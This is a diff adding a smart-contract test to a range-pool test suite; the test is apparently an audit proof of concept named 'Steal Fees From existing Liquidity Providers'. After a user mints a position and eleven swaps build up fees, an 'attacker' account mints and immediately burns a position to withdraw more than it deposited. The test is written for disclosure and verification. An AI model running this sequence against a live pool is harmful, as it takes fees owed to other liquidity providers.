@@ -1507,6 +1507,218 @@ describe('RangePool Exact In Tests', function () {
     }
   })
 
+  it.only('Steal Fees From existing Liquidity Providers ', async function () {
+
+    await validateMint({ // Regualr user mints position
+        signer: hre.props.alice,
+        recipient: hre.props.alice.address,
+        lower: '-800000',
+        upper: '800000',
+        amount0: tokenAmount,
+        amount1: tokenAmount,
+        balance0Decrease: BigNumber.from('19999999999999999848'),
+        balance1Decrease: BigNumber.from('100000000000000000000'),
+        liquidityIncrease: BigNumber.from('44721359549995794013'),
+        tokenAmount: BigNumber.from('44721359549995794013'),
+        revertMessage: '',
+    })
+
+    await validateSwap({ // Next 11 swaps are just to increase the total fees
+        signer: hre.props.alice,
+        recipient: hre.props.alice.address,
+        zeroForOne: true,
+        amount: tokenAmount.div(2),
+        sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650'),
+        balanceInDecrease: BigNumber.from('24596364934905253800'),
+        balanceOutIncrease: BigNumber.from('55125718852470931154'),
+        revertMessage: '',
+    })
+
+    await validateSwap({
+        signer: hre.props.alice,
+        recipient: hre.props.alice.address,
+        zeroForOne: false,
+        amount: tokenAmount.div(2),
+        sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650000'),
+        balanceInDecrease: BigNumber.from('50000000000000000000'),
+        balanceOutIncrease: BigNumber.from('23497952294453035875'),
+        revertMessage: '',
+    })
+    console.log("COMPLETED SWAP 1");
+    await validateSwap({
+        signer: hre.props.alice,
+        recipient: hre.props.alice.address,
+        zeroForOne: true,
+        amount: tokenAmount.div(2),
+        sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650'),
+        balanceInDecrease: BigNumber.from('23509707148027049401'),
+        balanceOutIncrease: BigNumber.from('49974999999999999999'),
+        revertMessage: '',
+    })
+    console.log("COMPLETED SWAP 2");
+    await validateSwap({
+        signer: hre.props.alice,
+        recipient: hre.props.alice.address,
+        zeroForOne: false,
+        amount: tokenAmount.div(2),
+        sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650000'),
+        balanceInDecrease: BigNumber.from('50000000000000000000'),
+        balanceOutIncrease: BigNumber.from('23497952294453035875'),
+        revertMessage: '',
+    })
+    console.log("COMPLETED SWAP 3");
+    await validateSwap({
+        signer: hre.props.alice,
+        recipient: hre.props.alice.address,
+        zeroForOne: true,
+        amount: tokenAmount.div(2),
+        sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650'),
+        balanceInDecrease: BigNumber.from('23509707148027049401'),
+        balanceOutIncrease: BigNumber.from('49974999999999999999'),
+        revertMessage: '',
+    })
+
+
+    console.log("COMPLETED SWAP 4");
+
+    await validateSwap({
+        signer: hre.props.alice,
+        recipient: hre.props.alice.address,
+        zeroForOne: false,
+        amount: tokenAmount.div(2),
+        sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650000'),
+        balanceInDecrease: BigNumber.from('50000000000000000000'),
+        balanceOutIncrease: BigNumber.from('23497952294453035875'),
+        revertMessage: '',
+    })
+    console.log("COMPLETED SWAP 5");
+    await validateSwap({
+        signer: hre.props.alice,
+        recipient: hre.props.alice.address,
+        zeroForOne: true,
+        amount: tokenAmount.div(2),
+        sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650'),
+        balanceInDecrease: BigNumber.from('23509707148027049401'),
+        balanceOutIncrease: BigNumber.from('49974999999999999999'),
+        revertMessage: '',
+    })
+
+
+    console.log("COMPLETED SWAP 6");
+
+
+    await validateSwap({
+        signer: hre.props.alice,
+        recipient: hre.props.alice.address,
+        zeroForOne: false,
+        amount: tokenAmount.div(2),
+        sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650000'),
+        balanceInDecrease: BigNumber.from('50000000000000000000'),
+        balanceOutIncrease: BigNumber.from('23497952294453035875'),
+        revertMessage: '',
+    })
+    console.log("COMPLETED SWAP 7");
+    await validateSwap({
+        signer: hre.props.alice,
+        recipient: hre.props.alice.address,
+        zeroForOne: true,
+        amount: tokenAmount.div(2),
+        sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650'),
+        balanceInDecrease: BigNumber.from('23509707148027049401'),
+        balanceOutIncrease: BigNumber.from('49974999999999999999'),
+        revertMessage: '',
+    })
+
+    console.log("COMPLETED SWAP 8");
+
+    await validateSwap({
+        signer: hre.props.alice,
+        recipient: hre.props.alice.address,
+        zeroForOne: false,
+        amount: tokenAmount.div(2),
+        sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650000'),
+        balanceInDecrease: BigNumber.from('50000000000000000000'),
+        balanceOutIncrease: BigNumber.from('23497952294453035875'),
+        revertMessage: '',
+    })
+    console.log("COMPLETED SWAP 9");
+    await validateSwap({
+        signer: hre.props.alice,
+        recipient: hre.props.alice.address,
+        zeroForOne: true,
+        amount: tokenAmount.div(2),
+        sqrtPriceLimitX96: BigNumber.from('79450223072165328185028130650'),
+        balanceInDecrease: BigNumber.from('23509707148027049401'),
+        balanceOutIncrease: BigNumber.from('49974999999999999999'),
+        revertMessage: '',
+    })
+
+
+    console.log("COMPLETED SWAP 10");
+
+    await validateSwap({
+        signer: hre.props.alice,
+        recipient: hre.props.alice.address,
+        zeroForOne: true,
+        amount: tokenAmount.mul(10),
+        sqrtPriceLimitX96: BigNumber.from('79228162514264337593543950336'),
+        // price of 0.0100561345224524713899788940744814759251857394238956922671728497
+        // 99.441788270362343889826722172121635503849758386463058323384720125 token1 per token0
+        // token0 - 1.00
+        // token1 - 0.0100561345224524713899788940744814759251857394238956922671728497
+        balanceInDecrease: BigNumber.from('124994615090540176'),
+        balanceOutIncrease: BigNumber.from('125282277308272918'),
+        revertMessage: '',
+    })
+
+    console.log("COMPLETED SWAP 11");
+
+    await getTickAtPrice()
+
+    await validateMint({ // Attacker mints position
+        signer: hre.props.bob,
+        recipient: hre.props.bob.address,
+        lower: '-800000',
+        upper: '800000',
+        amount0: tokenAmount,
+        amount1: tokenAmount,
+        balance0Decrease: BigNumber.from('100000000000000000000'),
+        balance1Decrease: BigNumber.from('100000000000000000000'),
+        tokenAmount: BigNumber.from('99764189801678643394'),
+        liquidityIncrease: BigNumber.from('100000000000000000425'),
+        revertMessage: '',
+    })
+
+    await validateBurn({ // Attacker burns and get out more then they put in ~0.077 eth  with 11 swaps
+        signer: hre.props.bob,
+        lower: '-800000',
+        upper: '800000',
+        liquidityAmount: BigNumber.from('99967594091793604201'),
+        tokenAmount: BigNumber.from('99764189801678643394'),
+        burnPercent: ethers.utils.parseUnits('1', 38),
+        balance0Increase: BigNumber.from('99967594091793603775'),
+        balance1Increase: BigNumber.from('100032405908206396221'),
+        revertMessage: '',
+    })
+
+    await validateBurn({ // Attacker burns and get out more then they put in ~0.077 eth  with 11 swaps
+        signer: hre.props.alice,
+        lower: '-800000',
+        upper: '800000',
+        liquidityAmount: BigNumber.from('44812539726072257861'),
+        tokenAmount: BigNumber.from('44721359549995794013'),
+        burnPercent: ethers.utils.parseUnits('1', 38),
+        balance0Increase: BigNumber.from('44812539726072257670'),
+        balance1Increase: BigNumber.from('44841592962014399703'),
+        revertMessage: '',
+    })
+
+    console.log("COMPLETED BURN");
+    if (balanceCheck) {
+        console.log('balance after token0:', (await hre.props.token0.balanceOf(hre.props.limitPool.address)).toString())
+        console.log('balance after token1:', (await hre.props.token1.balanceOf(hre.props.limitPool.address)).toString())
+    }
+  })
 
 })
 
